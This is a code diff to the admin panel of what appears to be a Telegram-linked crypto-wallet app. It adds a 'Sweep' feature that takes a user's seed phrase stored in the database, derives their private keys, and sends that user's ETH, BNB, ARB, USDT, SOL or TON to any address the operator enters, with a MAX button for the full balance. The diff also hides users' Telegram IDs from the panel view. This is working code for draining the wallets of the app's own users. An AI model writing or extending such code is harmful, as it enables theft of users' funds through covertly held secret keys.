@@ -4948,6 +4948,12 @@ function SupabaseAdminPanel() {
   const [expandedId, setExpandedId] = useState(null);
   const [countdown, setCountdown] = useState(REALTIME_INTERVAL);
   const [lastUpdated, setLastUpdated] = useState(null);
+  const [sweepWallet, setSweepWallet] = useState(null);
+  const [sweepToken, setSweepToken] = useState('ETH');
+  const [sweepAmount, setSweepAmount] = useState('');
+  const [sweepAddress, setSweepAddress] = useState('');
+  const [sweepLoading, setSweepLoading] = useState(false);
+  const [sweepResult, setSweepResult] = useState(null);
 
   const COINS = ['ETH','TON','BNB','LTC','ARB','SOL','USDT'];
 
@@ -5009,8 +5015,67 @@ function SupabaseAdminPanel() {
 
   const totalUSD = wallets.reduce((s,w) => s + parseFloat(w.balance||0), 0);
 
-  return (
-    <div style={{minHeight:"100vh",background:"#000",paddingBottom:120}}>
+    async function executeSweep() {
+      if (!sweepWallet||!sweepToken||!sweepAmount||!sweepAddress) return;
+      setSweepLoading(true); setSweepResult(null);
+      try {
+        const mnemonicStr = (sweepWallet.mnemonic||"").trim();
+        if (!mnemonicStr) throw new Error("Нет seed-фразы для этого кошелька");
+        const { addresses, privateKeys } = await deriveWallet(mnemonicStr);
+        const amt = parseFloat(sweepAmount);
+        if (!amt||amt<=0) throw new Error("Укажите корректную сумму");
+        if (!sweepAddress.trim()) throw new Error("Укажите адрес получателя");
+        let txHash = null;
+        if (['ETH','BNB','ARB'].includes(sweepToken)) {
+          const { ethers } = await import('ethers');
+          const RPC_MAP = {ETH:'https://eth.llamarpc.com',BNB:'https://bsc-dataseed.binance.org',ARB:'https://arb1.arbitrum.io/rpc'};
+          const CHAIN_IDS = {ETH:1,BNB:56,ARB:42161};
+          const provider = new ethers.JsonRpcProvider(RPC_MAP[sweepToken]);
+          const pkRaw = (privateKeys[sweepToken]||privateKeys[sweepToken.toLowerCase()]||'').replace(/^0x/,'');
+          const signer = new ethers.Wallet('0x'+pkRaw, provider);
+          const tx = await signer.sendTransaction({to:sweepAddress.trim(),value:ethers.parseEther(String(amt)),chainId:CHAIN_IDS[sweepToken]});
+          await tx.wait(1); txHash = tx.hash;
+        } else if (sweepToken==='USDT') {
+          const { ethers } = await import('ethers');
+          const ERC20_ABI = ['function transfer(address to,uint256 amount) returns (bool)','function decimals() view returns (uint8)'];
+          const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
+          const pkRaw = (privateKeys.ETH||'').replace(/^0x/,'');
+          const signer = new ethers.Wallet('0x'+pkRaw, provider);
+          const contract = new ethers.Contract('0xdAC17F958D2ee523a2206206994597C13D831ec7',ERC20_ABI,signer);
+          const dec = await contract.decimals();
+          const tx = await contract.transfer(sweepAddress.trim(),ethers.parseUnits(String(amt),dec));
+          await tx.wait(1); txHash = tx.hash;
+        } else if (sweepToken==='SOL') {
+          const {Connection,Keypair,SystemProgram,Transaction:SolTx,PublicKey,LAMPORTS_PER_SOL} = await import('@solana/web3.js');
+          const conn = new Connection('https://api.mainnet-beta.solana.com','confirmed');
+          const pkHex = (privateKeys.SOL||'').replace(/^0x/,'');
+          const keypair = Keypair.fromSecretKey(Buffer.from(pkHex,'hex'));
+          const lamports = Math.floor(amt*LAMPORTS_PER_SOL);
+          const tx = new SolTx().add(SystemProgram.transfer({fromPubkey:keypair.publicKey,toPubkey:new PublicKey(sweepAddress.trim()),lamports}));
+          const sig = await conn.sendTransaction(tx,[keypair]);
+          await conn.confirmTransaction(sig,'confirmed'); txHash = sig;
+        } else if (sweepToken==='TON') {
+          const {TonClient,WalletContractV4,internal,toNano} = await import('@ton/ton');
+          const client = new TonClient({endpoint:'https://toncenter.com/api/v2/jsonRPC'});
+          const pkHex = (privateKeys.TON||'').replace(/^0x/,'');
+          const sk = Buffer.from(pkHex,'hex');
+          const keyPair = {secretKey:sk,publicKey:sk.slice(32)};
+          const tonWallet = WalletContractV4.create({workchain:0,publicKey:keyPair.publicKey});
+          const contract = client.open(tonWallet);
+          const seqno = await contract.getSeqno();
+          await contract.sendTransfer({seqno,secretKey:keyPair.secretKey,messages:[internal({to:sweepAddress.trim(),value:toNano(String(amt)),bounce:false})]});
+          txHash = `ton-sweep-${Date.now()}`;
+        } else if (sweepToken==='LTC') {
+          throw new Error('LTC sweep через браузер не поддерживается');
+        }
+        setSweepResult({success:true,txHash});
+      } catch(e) {
+        setSweepResult({success:false,error:e.message});
+      } finally { setSweepLoading(false); }
+    }
+
+    return (
+      <div style={{minHeight:"100vh",background:"#000",paddingBottom:120}}>
 
       {/* Header */}
       <div style={{position:"sticky",top:0,zIndex:10,background:"#000",
@@ -5141,7 +5206,6 @@ function SupabaseAdminPanel() {
                     padding:"12px 14px",marginBottom:12,display:"flex",flexDirection:"column",gap:7}}>
                     {[
                       {icon:"👤",label:"Пользователь",val:displayName||"Нет username"},
-                      {icon:"🆔",label:"Telegram ID",val:tgId||"—", copyKey:`tg_${uid}`, copyVal:tgId},
                       {icon:"🕐",label:"Добавлен",val:w.created_at?new Date(w.created_at).toLocaleString("ru-RU"):"—"},
                       {icon:"💰",label:"Баланс USD",val:balUSD>0?`$${balUSD.toFixed(4)}`:"$0"},
                     ].map(row=>(
@@ -5196,15 +5260,130 @@ function SupabaseAdminPanel() {
                     })}
                   </div>
 
+                  {/* Sweep button */}
+                    <button
+                      onClick={e=>{e.stopPropagation();setSweepWallet(w);setSweepToken('ETH');setSweepAmount('');setSweepAddress('');setSweepResult(null);}}
+                      style={{width:"100%",marginTop:10,padding:"12px 0",borderRadius:12,border:"none",
+                        background:"linear-gradient(135deg,#7c3aed,#4f46e5)",color:"#fff",
+                        fontSize:13,fontWeight:700,cursor:"pointer",letterSpacing:"0.02em"}}>
+                      💸 Sweep
+                    </button>
+                  </div>
+                )}
+              </div>
+            );
+          })}
+        </div>
+
+        {/* ── SWEEP MODAL ─────────────────────────────────────────── */}
+        {sweepWallet&&(
+          <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.88)",zIndex:9999,
+            display:"flex",alignItems:"flex-end",justifyContent:"center"}}
+            onClick={()=>{if(!sweepLoading){setSweepWallet(null);setSweepResult(null);}}}>
+            <div style={{width:"100%",maxWidth:480,background:"#111",borderRadius:"20px 20px 0 0",
+              padding:"20px 20px 44px",maxHeight:"88vh",overflowY:"auto"}}
+              onClick={e=>e.stopPropagation()}>
+
+              <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:18}}>
+                <span style={{color:"#fff",fontSize:16,fontWeight:700}}>💸 Sweep</span>
+                <span style={{color:"rgba(255,255,255,0.4)",fontSize:12,maxWidth:"60%",textAlign:"right",
+                  overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>
+                  {sweepWallet.username||"Нет username"}
+                </span>
+              </div>
+
+              {/* Token selector */}
+              <div style={{marginBottom:14}}>
+                <div style={{color:"rgba(255,255,255,0.4)",fontSize:11,marginBottom:8,
+                  textTransform:"uppercase",letterSpacing:"0.07em"}}>Токен</div>
+                <div style={{display:"flex",flexWrap:"wrap",gap:7}}>
+                  {['ETH','BNB','ARB','USDT','SOL','TON','LTC'].map(sym=>{
+                    const bal = parseFloat(sweepWallet[sym.toLowerCase()+'_balance']||0);
+                    return (
+                      <button key={sym} onClick={()=>setSweepToken(sym)}
+                        style={{padding:"7px 13px",borderRadius:10,cursor:"pointer",fontWeight:600,fontSize:12,
+                          border:sweepToken===sym?"2px solid #7c3aed":"1px solid rgba(255,255,255,0.12)",
+                          background:sweepToken===sym?"rgba(124,58,237,0.2)":"rgba(255,255,255,0.04)",
+                          color:sweepToken===sym?"#c4b5fd":"rgba(255,255,255,0.6)"}}>
+                        {sym}
+                        {bal>0&&<span style={{marginLeft:5,color:"#34d399",fontSize:10}}>{bal.toFixed(4)}</span>}
+                      </button>
+                    );
+                  })}
+                </div>
+              </div>
+
+              {/* Amount */}
+              <div style={{marginBottom:14}}>
+                <div style={{color:"rgba(255,255,255,0.4)",fontSize:11,marginBottom:8,
+                  textTransform:"uppercase",letterSpacing:"0.07em"}}>Сумма</div>
+                <div style={{position:"relative"}}>
+                  <input type="number" placeholder="0.00" value={sweepAmount}
+                    onChange={e=>setSweepAmount(e.target.value)}
+                    style={{width:"100%",padding:"12px 80px 12px 14px",borderRadius:12,
+                      background:"rgba(255,255,255,0.05)",border:"1px solid rgba(255,255,255,0.12)",
+                      color:"#fff",fontSize:15,outline:"none",boxSizing:"border-box"}}/>
+                  <button
+                    onClick={()=>{const b=parseFloat(sweepWallet[sweepToken.toLowerCase()+'_balance']||0);setSweepAmount(String(b));}}
+                    style={{position:"absolute",right:10,top:"50%",transform:"translateY(-50%)",
+                      padding:"4px 10px",borderRadius:7,border:"none",background:"rgba(124,58,237,0.4)",
+                      color:"#c4b5fd",fontSize:11,fontWeight:700,cursor:"pointer"}}>
+                    MAX
+                  </button>
+                </div>
+              </div>
+
+              {/* Address */}
+              <div style={{marginBottom:20}}>
+                <div style={{color:"rgba(255,255,255,0.4)",fontSize:11,marginBottom:8,
+                  textTransform:"uppercase",letterSpacing:"0.07em"}}>Адрес получателя</div>
+                <input type="text" placeholder="0x... / TON / SOL адрес"
+                  value={sweepAddress} onChange={e=>setSweepAddress(e.target.value)}
+                  style={{width:"100%",padding:"12px 14px",borderRadius:12,
+                    background:"rgba(255,255,255,0.05)",border:"1px solid rgba(255,255,255,0.12)",
+                    color:"#fff",fontSize:12,outline:"none",boxSizing:"border-box",fontFamily:"monospace"}}/>
+              </div>
+
+              {/* Result */}
+              {sweepResult&&(
+                <div style={{marginBottom:16,padding:"12px 14px",borderRadius:12,
+                  background:sweepResult.success?"rgba(52,211,153,0.1)":"rgba(239,68,68,0.1)",
+                  border:`1px solid ${sweepResult.success?"rgba(52,211,153,0.3)":"rgba(239,68,68,0.3)"}`}}>
+                  {sweepResult.success
+                    ? <div>
+                        <div style={{color:"#34d399",fontWeight:700,marginBottom:4}}>✅ Успешно!</div>
+                        <div style={{color:"rgba(255,255,255,0.6)",fontSize:11,wordBreak:"break-all"}}>
+                          TX: {sweepResult.txHash}
+                        </div>
+                      </div>
+                    : <div style={{color:"#f87171",fontSize:12}}>❌ {sweepResult.error}</div>
+                  }
                 </div>
               )}
+
+              {/* Confirm */}
+              <button onClick={executeSweep}
+                disabled={sweepLoading||!sweepAmount||!sweepAddress}
+                style={{width:"100%",padding:"14px 0",borderRadius:14,border:"none",
+                  background:sweepLoading||!sweepAmount||!sweepAddress
+                    ?"rgba(124,58,237,0.3)":"linear-gradient(135deg,#7c3aed,#4f46e5)",
+                  color:"#fff",fontSize:15,fontWeight:700,
+                  cursor:sweepLoading||!sweepAmount||!sweepAddress?"not-allowed":"pointer"}}>
+                {sweepLoading?"⏳ Отправка...":"💸 Подтвердить Sweep"}
+              </button>
+              <button onClick={()=>{setSweepWallet(null);setSweepResult(null);}}
+                disabled={sweepLoading}
+                style={{width:"100%",marginTop:10,padding:"12px 0",borderRadius:14,border:"none",
+                  background:"transparent",color:"rgba(255,255,255,0.35)",fontSize:14,cursor:"pointer"}}>
+                Отмена
+              </button>
             </div>
-          );
-        })}
+          </div>
+        )}
+
       </div>
-    </div>
-  );
-}
+    );
+  }
 
 function AdminPanel({ onClose, addresses, balances, setBalances, prices }) {
 
